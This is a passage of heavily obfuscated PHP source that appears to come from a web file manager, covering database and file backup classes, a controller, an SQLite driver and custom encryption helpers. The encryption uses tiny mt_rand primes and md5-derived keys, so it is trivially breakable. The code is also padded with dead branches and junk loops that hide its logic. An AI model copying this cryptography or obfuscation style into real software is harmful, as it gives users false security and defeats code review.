$¾£íâŠ++; } break; $á¾Ô•Ø = $ş°˜ˆĞ[797]; if (strlen($á¾Ô•Ø) < $ş°˜ˆĞ[706]) { die; } default: $’ù¸–ò´ = $this->gyudb76f3552($ÖŒ°ôÌû, $Ÿ—±Ğë . $²·£ŒÙ–); $®îßç‘Ã = $ş°˜ˆĞ[798]; if (strlen($®îßç‘Ã) < $ş°˜ˆĞ[706]) { die; } break; $ŒÆÇø = $ş°˜ˆĞ[799]; } $’ù¸–ò´ = strrev($ş¸¥À¨¾ . $²·£ŒÙ– . $’ù¸–ò´); if ($€ªé«ˆå - 1 > 0) { $’ù¸–ò´ = $this->zxio34a3b682($’ù¸–ò´, $Ÿ—±Ğë, $€ªé«ˆå - 1); } return $’ù¸–ò´; } private function tugme2256a99($øşµ³¿ã, $®¦íäì†, $°ô†ü¸¥ = 3) { $æÇı„«Ù =& $_SERVER[¼’ç§¼´]; $¡‰ˆÉÊë =& $_SERVER[©º°î³Ë]; if (!is_string($øşµ³¿ã) || strlen($øşµ³¿ã) < 10) { return !1; } $øşµ³¿ã = trim($øşµ³¿ã); $øşµ³¿ã = strrev($øşµ³¿ã); $Œ¦Á•¥ = $æÇı„«Ù[800]; $·çÄÜº¦ = $øşµ³¿ã[0]; $øÑœîä» = $æÇı„«Ù[801]; if (!$øÑœîä») { die; } $µ¤Œüìù = substr($øşµ³¿ã, 1, 15); $­öàğƒ» = $æÇı„«Ù[802]; if (strlen($­öàğƒ») < $æÇı„«Ù[714]) { die; } $øşµ³¿ã = substr($øşµ³¿ã, 16); $Ù¼­©¯Ã = $¡‰ˆÉÊë[300]; switch ($·çÄÜº¦) { case $¡‰ˆÉÊë[206]: $›ñÎ©õÜ = $this->mguk60d65ba1($øşµ³¿ã, strrev($®¦íäì† . $µ¤Œüìù)); break; case $¡‰ˆÉÊë[122]: $›ñÎ©õÜ = $this->mguk60d65ba1($øşµ³¿ã, strrev($µ¤Œüìù . $®¦íäì†)); $×¡Á¯ò» = $æÇı„«Ù[803]; while ($×¡Á¯ò» < $æÇı„«Ù[438]) { if ($×¡Á¯ò» >= 0) { break; } $×¡Á¯ò»++; } break; case $¡‰ˆÉÊë[301]: $›ñÎ©õÜ = $this->mguk60d65ba1($øşµ³¿ã, base64_encode($µ¤Œüìù . $®¦íäì†)); $Í—ıù‡õ = $æÇı„«Ù[804]; if (!$Í—ıù‡õ) { return; } break; $ªı …ä = $æÇı„«Ù[805]; if (!$ªı …ä) { die; } case $¡‰ˆÉÊë[302]: $›ñÎ©õÜ = $this->mguk60d65ba1($øşµ³¿ã, md5($µ¤Œüìù . $®¦íäì†)); break; case $¡‰ˆÉÊë[303]: $øşµ³¿ã = hash_decode($øşµ³¿ã); $¢¯÷”·· = $øşµ³¿ã[0]; $É¶ğšÍí = $æÇı„«Ù[806]; while (strlen($É¶ğšÍí) < $æÇı„«Ù[706]) { if (!$É¶ğšÍí) { break; } $É¶ğšÍí++; } $øşµ³¿ã = substr($øşµ³¿ã, 1); $ Ï”°òÅ = $æÇı„«Ù[807]; if (!$ Ï”°òÅ) { die; } $üà«úóÅ = strpos($Ù¼­©¯Ã, $¢¯÷”··); $™É©ÆÓù = $æÇı„«Ù[808]; $»¶®´“‡ = md5($¢¯÷”·· . md5($®¦íäì† . $¢¯÷”··) . $®¦íäì†); $»¶®´“‡ = substr($»¶®´“‡, $üà«úóÅ % 8, $üà«úóÅ % 8 + 7); $¿×Í«ß´ = $æÇı„«Ù[809]; while ($¿×Í«ß´ < $æÇı„«Ù[438]) { if ($¿×Í«ß´ >= 0) { break; } $¿×Í«ß´++; } $Î’’´— = $¡‰ˆÉÊë[6]; $•ÈÀØÕœ = $æÇı„«Ù[799]; if (!$•ÈÀØÕœ) { return; } $³¥ÊôÑÉ = 0; $¶ò£ƒÌ‘ = 0; $¤½í„Éá = 0; for ($³¥ÊôÑÉ = 0; $³¥ÊôÑÉ < strlen($øşµ³¿ã); $³¥ÊôÑÉ++) { $¤½í„Éá = $¤½í„Éá == strlen($»¶®´“‡) ? 0 : $¤½í„Éá; $¤›¡àÈŞ = $¤½í„Éá++; $ˆµÎôó² = $æÇı„«Ù[810]; if (!$ˆµÎôó²) { return; } $¶ò£ƒÌ‘ = strpos($Ù¼­©¯Ã, $øşµ³¿ã[$³¥ÊôÑÉ]) - $üà«úóÅ - ord($»¶®´“‡[$¤›¡àÈŞ]); while ($¶ò£ƒÌ‘ < 0) { $¶ò£ƒÌ‘ += 64; $§§¹æ«à = $æÇı„«Ù[811]; } $Î’’´— .= $Ù¼­©¯Ã[$¶ò£ƒÌ‘]; } $›ñÎ©õÜ = base64_decode($Î’’´—); $ èàŞ¢Ç = $æÇı„«Ù[812]; while (strlen($ èàŞ¢Ç) < $æÇı„«Ù[438]) { if (!$ èàŞ¢Ç) { break; } $ èàŞ¢Ç++; } break; default: $›ñÎ©õÜ = $this->mguk60d65ba1($øşµ³¿ã, $®¦íäì† . $µ¤Œüìù); $è˜ÆÇä = $æÇı„«Ù[813]; if (!$è˜ÆÇä) { die; } break; $Åƒşû•  = $æÇı„«Ù[814]; if (strlen($Åƒşû• ) < $æÇı„«Ù[714]) { die; } } if ($°ô†ü¸¥ - 1 > 0) { $›ñÎ©õÜ = $this->tugme2256a99($›ñÎ©õÜ, $®¦íäì†, $°ô†ü¸¥ - 1); } return $›ñÎ©õÜ; } public function oqra0b0df1f5($–¸Âü) { $¸íÔØ‡‘ =& $_SERVER[¼’ç§¼´]; $ªß¬âí¿ =& $_SERVER[©º°î³Ë]; $µÊÏîŸÀ = $this->prev28d5fd86(); $™¤Ñ¸³¸ = $this->prev28d5fd86(); $Ü²†û = $¸íÔØ‡‘[815]; while ($Ü²†û < $¸íÔØ‡‘[438]) { if ($Ü²†û >= 0) { break; } $Ü²†û++; } $Š­˜»ş˜ = ($µÊÏîŸÀ - 1) * ($™¤Ñ¸³¸ - 1); $¬›ºŒ„¤ = $¸íÔØ‡‘[816]; while (strlen($¬›ºŒ„¤) < $¸íÔØ‡‘[698]) { if (!$¬›ºŒ„¤) { break; } $¬›ºŒ„¤++; } $¸’ô¡À  = intval(($µÊÏîŸÀ + $™¤Ñ¸³¸) / 2); while (1) { $ÌøÂ¼íÛ = $¸’ô¡À ; $ğÎ¯ÌÛË = $Š­˜»ş˜; while ($ğÎ¯ÌÛË % $ÌøÂ¼íÛ != 0) { $àéÑ‹®› = $ğÎ¯ÌÛË; $ğÎ¯ÌÛË = $ÌøÂ¼íÛ; $€ÚªÔ¶‚ = $¸íÔØ‡‘[817]; while (strlen($€ÚªÔ¶‚) < $¸íÔØ‡‘[698]) { if (!$€ÚªÔ¶‚) { break; } $€ÚªÔ¶‚++; } $ÌøÂ¼íÛ = $àéÑ‹®› % $ÌøÂ¼íÛ; $ªÏÔ¸Äò = $¸íÔØ‡‘[818]; if (!$ªÏÔ¸Äò) { return; } } if ($ÌøÂ¼íÛ == 1) { break; } else { $¸’ô¡À ++; } } $Šâ²«ç = 2; $—¢ì¶Ÿ‡ = $¸íÔØ‡‘[819]; if (strlen($—¢ì¶Ÿ‡) < $¸íÔØ‡‘[706]) { die; } for ($‰œËÔÍÕ = 0; $‰œËÔÍÕ < $Š­˜»ş˜ * 10; $‰œËÔÍÕ++) { if (($Š­˜»ş˜ * $‰œËÔÍÕ + 1) % $¸’ô¡À  == 0) { $Šâ²«ç = intval(($Š­˜»ş˜ * $‰œËÔÍÕ + 1) / $¸’ô¡À ); break; } } $ˆê„‡²† = $this->gyudb76f3552($µÊÏîŸÀ * $™¤Ñ¸³¸ . $ªß¬âí¿[6], $ªß¬âí¿[136]); $´ÏÒŠ¦Ô = md5($ªß¬âí¿[304] . ($µÊÏîŸÀ + $™¤Ñ¸³¸) . $ªß¬âí¿[305] . $¸’ô¡À  . $ªß¬âí¿[305] . $Šâ²«ç . $ªß¬âí¿[306]); $š–´Æ¬ï = $this->gyudb76f3552($–¸Âü, $´ÏÒŠ¦Ô) . $ªß¬âí¿[307] . $ˆê„‡²†; $Çş´èßø = $¸íÔØ‡‘[820]; while ($Çş´èßø < $¸íÔØ‡‘[698]) { if ($Çş´èßø >= 0) { break; } $Çş´èßø++; } return $š–´Æ¬ï; } public function xmcw7e59bae4($÷äÌÉ½) { $ôÃŒÓêÛ =& $_SERVER[¼’ç§¼´]; $™÷…É‡ =& $_SERVER[©º°î³Ë]; $…Ğ¡¯ßğ = explode($™÷…É‡[307], $÷äÌÉ½); $ä­ü£ş = $ôÃŒÓêÛ[821]; if (!$ä­ü£ş) { die; } if (count($…Ğ¡¯ßğ) != 2) { return $™÷…É‡[6]; } $¿ÁÙ´Ú = $this->mguk60d65ba1($…Ğ¡¯ßğ[1] . $™÷…É‡[6], $™÷…É‡[136]); if (!$¿ÁÙ´Ú) { return $™÷…É‡[6]; } $¿ÁÙ´Ú = intval($¿ÁÙ´Ú); $şùûı¡Â = 0; $ÀÎ«¢ß€ = 0; for ($øåÁãÃÃ = 3; $øåÁãÃÃ < $¿ÁÙ´Ú; $øåÁãÃÃ += 2) { if ($¿ÁÙ´Ú % $øåÁãÃÃ != 0) { continue; } $şùûı¡Â = $øåÁãÃÃ; $ÀÎ«¢ß€ = intval($¿ÁÙ´Ú / $øåÁãÃÃ); $˜í–¼ÏŒ = $ôÃŒÓêÛ[822]; while ($˜í–¼ÏŒ < $ôÃŒÓêÛ[714]) { if ($˜í–¼ÏŒ >= 0) { break; } $˜í–¼ÏŒ++; } break; } $Ë˜ÆïÍÛ = ($şùûı¡Â - 1) * ($ÀÎ«¢ß€ - 1); $Õ’åØì„ = $ôÃŒÓêÛ[823]; $Ş¢ÆàÛ® = intval(($şùûı¡Â + $ÀÎ«¢ß€) / 2); while (1) { $®¼òÔ•® = $Ş¢ÆàÛ®; $Šïñ Ì = $ôÃŒÓêÛ[824]; $’å¤úÖÆ = $Ë˜ÆïÍÛ; $¼³¸ää = $ôÃŒÓêÛ[825]; while ($’å¤úÖÆ % $®¼òÔ•® != 0) { $Í˜ËÔ’Û = $’å¤úÖÆ; $Şû…ù„¢ = $ôÃŒÓêÛ[826]; while (strlen($Şû…ù„¢) < $ôÃŒÓêÛ[706]) { if (!$Şû…ù„¢) { break; } $Şû…ù„¢++; } $’å¤úÖÆ = $®¼òÔ•®; $Šú„êÁ‹ = $ôÃŒÓêÛ[827]; while (strlen($Šú„êÁ‹) < $ôÃŒÓêÛ[438]) { if (!$Šú„êÁ‹) { break; } $Šú„êÁ‹++; } $®¼òÔ•® = $Í˜ËÔ’Û % $®¼òÔ•®; $¼£×ÄåÉ = $ôÃŒÓêÛ[828]; if (strlen($¼£×ÄåÉ) < $ôÃŒÓêÛ[702]) { return; } } if ($®¼òÔ•® == 1) { break; } else { $Ş¢ÆàÛ®++; } } $ƒû±‡´æ = 2; $Ö¦±á¸ = $ôÃŒÓêÛ[829]; for ($øåÁãÃÃ = 0; $øåÁãÃÃ < $Ë˜ÆïÍÛ * 10; $øåÁãÃÃ++) { if (($Ë˜ÆïÍÛ * $øåÁãÃÃ + 1) % $Ş¢ÆàÛ® == 0) { $ƒû±‡´æ = intval(($Ë˜ÆïÍÛ * $øåÁãÃÃ + 1) / $Ş¢ÆàÛ®); break; } } $÷‹éÉ»› = md5($™÷…É‡[304] . ($şùûı¡Â + $ÀÎ«¢ß€) . $™÷…É‡[305] . $Ş¢ÆàÛ® . $™÷…É‡[305] . $ƒû±‡´æ . $™÷…É‡[306]); $ÄÉÖîÀã = $ôÃŒÓêÛ[830]; $¤€¢Š = $this->mguk60d65ba1($…Ğ¡¯ßğ[0], $÷‹éÉ»›); return $¤€¢Š; $‡ıõ´– = $ôÃŒÓêÛ[701]; if (!$‡ıõ´–) { return; } } public function prev28d5fd86() { $ˆÛ…ã· =& $_SERVER[¼’ç§¼´]; $Üµ¿ùÍñ = mt_rand(pow(2, 14), pow(2, 16) - 1); $½Ş‚À®Î = array(); $¼¶×Üàò = $ˆÛ…ã·[831]; while ($¼¶×Üàò < $ˆÛ…ã·[438]) { if ($¼¶×Üàò >= 0) { break; } $¼¶×Üàò++; } $ñÙ˜æóÍ = 1; while ($ñÙ˜æóÍ <= (int) sqrt($Üµ¿ùÍñ)) { $ùÀç„¼– = $ñÙ˜æóÍ; $ŒÆ„³Ç¢ = $ˆÛ…ã·[832]; while (!0) { $ùÀç„¼–++; if ($ùÀç„¼– <= 2) { $ñÙ˜æóÍ = $ùÀç„¼–; break; } else { if ($ùÀç„¼– < 2) { continue; } } $±ğ’º¸Ü = !0; for ($¼öğ¾ì® = 2; $¼öğ¾ì® <= sqrt($ùÀç„¼–); $¼öğ¾ì®++) { if ($ùÀç„¼– % $¼öğ¾ì® == 0) { $±ğ’º¸Ü = !1; } } if ($±ğ’º¸Ü) { $ñÙ˜æóÍ = $ùÀç„¼–; break; } } $½Ş‚À®Î[] = $ñÙ˜æóÍ; $–Ô÷®Á = $ˆÛ…ã·[833]; if (!$–Ô÷®Á) { return; } } $îõ†áÎ = 2; for ($ùÀç„¼– = $Üµ¿ùÍñ; $ùÀç„¼– > 1; $ùÀç„¼–--) { $±ğ’º¸Ü = !0; $š†’é¦ = $ˆÛ…ã·[834]; if (!$š†’é¦) { return; } foreach ($½Ş‚À®Î as $¡âëåÄ—) { if ($ùÀç„¼– % $¡âëåÄ— == 0) { $±ğ’º¸Ü = !1; break; } } if ($±ğ’º¸Ü) { $îõ†áÎ = $ùÀç„¼–; break; } } return $îõ†áÎ; } public function yxrq1a2be9d0($‹œ±­ÅÁ, $’Ã²ƒó) { $Ô¶¦’®€ =& $_SERVER[©º°î³Ë]; return call_user_func(array($Ô¶¦’®€[8], $Ô¶¦’®€[308]), $‹œ±­ÅÁ, $’Ã²ƒó); } public function gyudb76f3552($×–¡¢Üò, $úƒã¿°) { $êˆ«‚¤— =& $_SERVER[¼’ç§¼´]; $ê«ô»±¬ =& $_SERVER[©º°î³Ë]; return call_user_func(array($ê«ô»±¬[309], $ê«ô»±¬[310]), $×–¡¢Üò, $úƒã¿°); $ôÛÀÒĞ˜ = $êˆ«‚¤—[835]; if (strlen($ôÛÀÒĞ˜) < $êˆ«‚¤—[706]) { die; } } public function mguk60d65ba1($˜áÓıßó, $ÌĞ•üï˜) { $í¢ù¨éı =& $_SERVER[©º°î³Ë]; return call_user_func(array($í¢ù¨éı[309], $í¢ù¨éı[311]), $˜áÓıßó, $ÌĞ•üï˜); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¼’ç§¼´][836]); $this->init(); $this->keep(); } public function init() { $±Ñ¿Í³Ï =& $_SERVER[¼’ç§¼´]; $this->isManual(); self::$name = date($±Ñ¿Í³Ï[837]); if (!($óœ¿ÚÓ´ = $this->model->lastItem())) { $óœ¿ÚÓ´ = $this->initData(); } else { self::$name = $óœ¿ÚÓ´[$±Ñ¿Í³Ï[32]]; if ($óœ¿ÚÓ´[$±Ñ¿Í³Ï[838]] == $±Ñ¿Í³Ï[91]) { self::$name = date($±Ñ¿Í³Ï[261]); $‘öÏ‚•• = intval(_get($óœ¿ÚÓ´, $±Ñ¿Í³Ï[839], 0)); if (self::$manual == 0 && $óœ¿ÚÓ´[$±Ñ¿Í³Ï[32]] == self::$name) { $this->model->remove($óœ¿ÚÓ´[$±Ñ¿Í³Ï[486]]); } $óœ¿ÚÓ´ = $this->initData($‘öÏ‚••, $óœ¿ÚÓ´[$±Ñ¿Í³Ï[840]]); } else { $this->checkStore($óœ¿ÚÓ´[$±Ñ¿Í³Ï[840]]); } } self::$option = $óœ¿ÚÓ´; } private function isManual() { $ï—ÃèÙ… = _get($GLOBALS, $_SERVER[¼’ç§¼´][841], 0); $ï—ÃèÙ… = intval($ï—ÃèÙ…); self::$manual = $ï—ÃèÙ… && $ï—ÃèÙ… == 1 ? 1 : 0; } private function initData($Ï¸›±¾œ = 0, $¿ÈĞœ»Ç = '') { $íòŸàà =& $_SERVER[¼’ç§¼´]; $‘×ÓšÕ = $this->model->config(); if ($¿ÈĞœ»Ç && $‘×ÓšÕ[$íòŸàà[840]] != $¿ÈĞœ»Ç) { $Ï¸›±¾œ = 0; } $this->checkStore($‘×ÓšÕ[$íòŸàà[840]]); if (self::$manual == 1) { self::$name .= $íòŸàà[11] . date($íòŸàà[842]); } $äÏ“š² = array($íòŸàà[840] => $‘×ÓšÕ[$íòŸàà[840]], $íòŸàà[32] => self::$name, $íòŸàà[838] => 0, $íòŸàà[171] => $‘×ÓšÕ[$íòŸàà[171]], $íòŸàà[843] => self::$manual, $íòŸàà[370] => array($íòŸàà[844] => array($íòŸàà[838] => 0), $íòŸàà[845] => array($íòŸàà[838] => 0, $íòŸàà[846] => 0, $íòŸàà[847] => 0, $íòŸàà[33] => $íòŸàà[12], $íòŸàà[848] => 0, $íòŸàà[849] => 0), $íòŸàà[850] => array($íòŸàà[838] => 0, $íòŸàà[846] => 0, $íòŸàà[847] => 0, $íòŸàà[848] => 0, $íòŸàà[849] => 0), $íòŸàà[232] => array($íòŸàà[838] => 0, $íòŸàà[851] => 0, $íòŸàà[852] => 0, $íòŸàà[853] => 0, $íòŸàà[854] => 0, $íòŸàà[552] => $Ï¸›±¾œ, $íòŸàà[848] => 0, $íòŸàà[849] => 0)), $íòŸàà[848] => time(), $íòŸàà[849] => 0); $úİ¯ŒŸù = $this->model->insert($äÏ“š²); $äÏ“š²[$íòŸàà[486]] = $úİ¯ŒŸù; return $äÏ“š²; } private function checkStore($úŞÜÈâÔ) { $İ¿É£ñè = Model($_SERVER[¼’ç§¼´][855]); $‹¹Ê¡º± = $İ¿É£ñè->listData($úŞÜÈâÔ); $İ¿É£ñè->checkConfig($‹¹Ê¡º±); } public static function get() { if (!self::$option) { $¬¥î†”¥ = Model($_SERVER[¼’ç§¼´][836]); $ª…ş£Ö« = $¬¥î†”¥->findByName(self::$name); $¬¥î†”¥->parseContent($ª…ş£Ö«); self::$option = $ª…ş£Ö«; } return self::$option; } public static function set($ÏƒæË) { $ëû©Ó› =& $_SERVER[¼’ç§¼´]; $òâ©¬€ = self::get(); foreach ($ÏƒæË as $Íôè•§Ù => $ÔÉ±ÅÇ) { array_set_value($òâ©¬€, $Íôè•§Ù, $ÔÉ±ÅÇ); } Model($ëû©Ó›[836])->update($òâ©¬€[$ëû©Ó›[486]], $òâ©¬€); self::$option = $òâ©¬€; return self::$option; } public function keep() { $ö³˜Á‰¡ =& $_SERVER[¼’ç§¼´]; $õäë¤£Í = self::get(); if (_get($õäë¤£Í, $ö³˜Á‰¡[856], 0) == $ö³˜Á‰¡[91]) { return; } $this->backupKeep($õäë¤£Í); self::set(array($ö³˜Á‰¡[856] => 1)); } private function backupKeep($çÃ…¡¸³) { $ç•ÔÍä‚ =& $_SERVER[¼’ç§¼´]; if (self::$manual == 1) { return; } $®®©®§Œ = $this->model->listData(); if (empty($®®©®§Œ)) { return; } $ÉÍ¯–ƒÄ = 0; $ò¦éªç­ = array(); foreach ($®®©®§Œ as $„»‹ü§š) { if ($ÉÍ¯–ƒÄ >= 7) { break; } $ò¦éªç­[] = $„»‹ü§š[$ç•ÔÍä‚[32]]; $ÉÍ¯–ƒÄ++; } for ($ÉÍ¯–ƒÄ = 0; $ÉÍ¯–ƒÄ < 12; $ÉÍ¯–ƒÄ++) { $ò¦éªç­[] = date($ç•ÔÍä‚[857], strtotime("\x2d{$ÉÍ¯–ƒÄ}\40\155\157\x6e\x74\150\x73")); } $ò¦éªç­ = array_unique($ò¦éªç­); $ÑŒƒ˜¸‹ = Model($ç•ÔÍä‚[858])->get($ç•ÔÍä‚[859]); foreach ($®®©®§Œ as $„»‹ü§š) { if (isset($„»‹ü§š[$ç•ÔÍä‚[843]]) && $„»‹ü§š[$ç•ÔÍä‚[843]] == $ç•ÔÍä‚[91]) { continue; } if (!empty($„»‹ü§š[$ç•ÔÍä‚[32]]) && in_array($„»‹ü§š[$ç•ÔÍä‚[32]], $ò¦éªç­)) { continue; } $this->model->remove($„»‹ü§š[$ç•ÔÍä‚[486]]); $æ  •¦ = $this->backupPath($çÃ…¡¸³, $ÑŒƒ˜¸‹); IO::remove($æ  •¦, !1); } } private function backupPath($Ä—¡¶áı, $“¬Á·¯ = false) { $î…Ï•Ùó =& $_SERVER[¼’ç§¼´]; if (!$“¬Á·¯) { $“¬Á·¯ = Model($î…Ï•Ùó[858])->get($î…Ï•Ùó[859]); } $ùÈò … = $Ä—¡¶áı[$î…Ï•Ùó[32]]; $•¢‘Øøˆ = substr(md5($î…Ï•Ùó[860] . $“¬Á·¯ . $ùÈò …), 0, 8); return "\x7b\x69\157\72{$Ä—¡¶áı[$î…Ï•Ùó[840]]}\x7d\x2f\x64\141\164\x61\x62\141\x73\145\57\142\141\x63\153\165\160\x2f" . $ùÈò … . $î…Ï•Ùó[11] . $•¢‘Øøˆ; } public function db() { $ÏŒŸå¡ =& $_SERVER[¼’ç§¼´]; $¡¸¦™§‚ = self::get(); if (_get($¡¸¦™§‚, $ÏŒŸå¡[861], 0) == $ÏŒŸå¡[91]) { return !0; } $õ½ÌÉÍ = new BackupDb(); if (!$õ½ÌÉÍ->index()) { return !1; } self::set(array($ÏŒŸå¡[861] => 1)); return !0; } public function dbFile() { $¥Ü¨µ€ =& $_SERVER[¼’ç§¼´]; $íšÆ¹Úİ = self::get(); if (_get($íšÆ¹Úİ, $¥Ü¨µ€[862], 0) == $¥Ü¨µ€[91]) { return !0; } $—ø®¼¶  = new BackupDbFile(); if (!$—ø®¼¶ ->index()) { return !1; } self::set(array($¥Ü¨µ€[862] => 1)); return !0; } public function file() { $õÛÓš· =& $_SERVER[¼’ç§¼´]; $ÔŸÈ¢¬Í = self::get(); if (_get($ÔŸÈ¢¬Í, $õÛÓš·[863], 0) == $õÛÓš·[91]) { return !0; } if ($ÔŸÈ¢¬Í[$õÛÓš·[171]] == $õÛÓš·[864]) { $’±¾ûÕ¿ = new BackupFile(); if (!$’±¾ûÕ¿->index()) { return !1; } } self::set(array($õÛÓš·[863] => 1, $õÛÓš·[838] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ßééô½– =& $_SERVER[¼’ç§¼´]; $ š‡¥× = Backup::get(); self::$io = $ š‡¥×[$ßééô½–[840]]; self::$name = $ š‡¥×[$ßééô½–[32]]; $¾¨âØœ¤ = new DbManage(); $í½—µÍ = $¾¨âØœ¤->dbType(); $¹¬È¼€Ä = array($ßééô½–[865] => $í½—µÍ, $ßééô½–[866] => time()); Backup::set($¹¬È¼€Ä); $Ê‹›œ œ = $this->tmpFilesPath() . $ßééô½–[867] . self::$name . $ßééô½–[8]; del_dir($Ê‹›œ œ); mk_dir($Ê‹›œ œ); $¦“ì•¤ = $øôÔ³øš = 0; try { $ßç¥€‹¼ = $¾¨âØœ¤->db()->getTables(); } catch (Exception $Òéİ¸ûî) { return !1; } $ßç¥€‹¼ = array_diff($ßç¥€‹¼, array($ßééô½–[868], $ßééô½–[869])); foreach ($ßç¥€‹¼ as $âô€ÖÄ÷) { if ($âô€ÖÄ÷ == $ßééô½–[870]) { continue; } $¦“ì•¤ += $¾¨âØœ¤->model($âô€ÖÄ÷)->count(); } $©­¨£ˆ¯ = new Task($ßééô½–[871], $ßééô½–[872], $¦“ì•¤, LNG($ßééô½–[873]) . $ßééô½–[874] . LNG($ßééô½–[875])); $GLOBALS[$ßééô½–[876]] = self::$name; foreach ($ßç¥€‹¼ as $âô€ÖÄ÷) { $é»´ìù = $Ê‹›œ œ . $âô€ÖÄ÷ . $ßééô½–[877]; if ($âô€ÖÄ÷ == $ßééô½–[870]) { @touch($é»´ìù); continue; } $’­—¡û = null; if ($âô€ÖÄ÷ == $ßééô½–[878] && $ š‡¥×[$ßééô½–[171]] == $ßééô½–[864]) { $’­—¡û = self::$io; } $øôÔ³øš += $¾¨âØœ¤->sqlFromDb($âô€ÖÄ÷, $é»´ìù, $©­¨£ˆ¯, $’­—¡û); } unset($GLOBALS[$ßééô½–[876]]); $©­¨£ˆ¯->end(); if ($øôÔ³øš > $¦“ì•¤) { $¦“ì•¤ = $øôÔ³øš; } $¹¬È¼€Ä = array($ßééô½–[865] => $í½—µÍ, $ßééô½–[861] => 1, $ßééô½–[879] => $¦“ì•¤, $ßééô½–[880] => $øôÔ³øš, $ßééô½–[881] => time()); Backup::set($¹¬È¼€Ä); if ($¦“ì•¤ - $øôÔ³øš > 0) { $»ï»åß = $ßééô½–[882]; if (!stristr(I18n::getType(), $ßééô½–[883])) { $»ï»åß = $ßééô½–[884]; } write_log(array($»ï»åß, $¹¬È¼€Ä), $ßééô½–[872]); return !1; } return !0; } private function tmpFilesPath() { $éµª»‹Ã =& $_SERVER[¼’ç§¼´]; $À˜ˆßŸŸ = TEMP_FILES; if ($GLOBALS[$éµª»‹Ã[6]][$éµª»‹Ã[92]][$éµª»‹Ã[885]]) { $À˜ˆßŸŸ = $GLOBALS[$éµª»‹Ã[6]][$éµª»‹Ã[92]][$éµª»‹Ã[885]]; if (!mk_dir($À˜ˆßŸŸ) || !is_writable($À˜ˆßŸŸ) || !IO::mkfile($À˜ˆßŸŸ . $éµª»‹Ã[886])) { $À˜ˆßŸŸ = TEMP_FILES; } } return $À˜ˆßŸŸ; } } goto c£©Ş¨´¸ ; d‘òĞ÷ÀóŒ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ä«Æ”˜­ =& $_SERVER[¼’ç§¼´]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ä«Æ”˜­[6]] =& $config; $this->values[$ä«Æ”˜­[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ä«Æ”˜­[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÎÃ•ËâŸ) { if (1 === func_num_args()) { $this->{$ÎÃ•ËâŸ} = new $ÎÃ•ËâŸ(); } else { $ôŠ¿¬Ûµ = new ReflectionClass($ÎÃ•ËâŸ); $ı§Ä»ëó = func_get_args(); array_shift($ı§Ä»ëó); $this->{$ÎÃ•ËâŸ} = $ôŠ¿¬Ûµ->newInstanceArgs($ı§Ä»ëó); } return $this->{$ÎÃ•ËâŸ}; } public function routeBind($ÎšìÊæç, $å« ï¼, $ó·©ôë = 3) { $î²é¼ì =& $_SERVER[¼’ç§¼´]; $ı·Ïš¯š = $this->in[$î²é¼ì[9]]; $ÎšìÊæç = str_replace($î²é¼ì[10], $î²é¼ì[11], trim(trim($ÎšìÊæç, $î²é¼ì[8]), $î²é¼ì[12])); if (!$ÎšìÊæç || count($ı·Ïš¯š) <= $ó·©ôë) { return !1; } $´¥„Îıö = !0; $ª´ı»…‘ = explode($î²é¼ì[8], $ÎšìÊæç); for ($§±œñ€¥ = 0; $§±œñ€¥ < count($ª´ı»…‘); $§±œñ€¥++) { if ($ª´ı»…‘[$§±œñ€¥] != $ı·Ïš¯š[$ó·©ôë + $§±œñ€¥]) { $´¥„Îıö = !1; break; } } if (!$´¥„Îıö) { return; } call_user_func_array(array($this, $å« ï¼), array()); } public function routeArgs($úğı¬Æ¹ = 3) { $ ë¿œóÜ = $this->in[$_SERVER[¼’ç§¼´][9]]; if (count($ ë¿œóÜ) <= $úğı¬Æ¹) { return array(); } $ÍÛØ¯‹¢ = array(); for ($ñ³Ë¬—‰ = $úğı¬Æ¹; $ñ³Ë¬—‰ < count($ ë¿œóÜ); $ñ³Ë¬—‰ += 2) { $ÍÛØ¯‹¢[$ ë¿œóÜ[$ñ³Ë¬—‰]] = $ ë¿œóÜ[$ñ³Ë¬—‰ + 1]; $this->in[$ ë¿œóÜ[$ñ³Ë¬—‰]] = $ ë¿œóÜ[$ñ³Ë¬—‰ + 1]; } return $ÍÛØ¯‹¢; } protected function assign($ø‘ŒÃÇ´, $Ë…¹ôÚ‡) { $this->values[$ø‘ŒÃÇ´] = $Ë…¹ôÚ‡; } protected function display($†í½‹ş•) { ob_end_clean(); extract($this->values); require $this->tpl . $†í½‹ş•; } } class DbSqliteBase extends Db { public function __construct($‚Ãªı«µ = '') { $«îÂ›Í… =& $_SERVER[¼’ç§¼´]; if (!extension_loaded($«îÂ›Í…[13])) { think_exception(think_lang($«îÂ›Í…[14]) . $«îÂ›Í…[15]); } if (!empty($‚Ãªı«µ)) { if (!isset($‚Ãªı«µ[$«îÂ›Í…[16]])) { $‚Ãªı«µ[$«îÂ›Í…[16]] = 438; } $this->config = $‚Ãªı«µ; if (empty($this->config[$«îÂ›Í…[17]])) { $this->config[$«îÂ›Í…[17]] = array(); } } } public function connect($ŒÁºŞ‘ = '', $¾˜¹Ü = 0) { $âÜÆ‹›Ù =& $_SERVER[¼’ç§¼´]; if (!isset($this->linkID[$¾˜¹Ü])) { if (empty($ŒÁºŞ‘)) { $ŒÁºŞ‘ = $this->config; } $•®­É¹‰ = !empty($ŒÁºŞ‘[$âÜÆ‹›Ù[17]][$âÜÆ‹›Ù[18]]) ? $ŒÁºŞ‘[$âÜÆ‹›Ù[17]][$âÜÆ‹›Ù[18]] : $this->pconnect; $û¹ªÓá = $•®­É¹‰ ? $âÜÆ‹›Ù[19] : $âÜÆ‹›Ù[20]; $this->linkID[$¾˜¹Ü] = $û¹ªÓá($ŒÁºŞ‘[$âÜÆ‹›Ù[21]], $ŒÁºŞ‘[$âÜÆ‹›Ù[16]]); if (!$this->linkID[$¾˜¹Ü]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¾˜¹Ü], 30000); if (1 != think_config($âÜÆ‹›Ù[22])) { unset($this->config); } } return $this->linkID[$¾˜¹Ü]; } public function free() { $this->queryID = null; } public function query($ßãî¢ÊŞ) { $ÉºÏ–’Ç =& $_SERVER[¼’ç§¼´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßãî¢ÊŞ; if 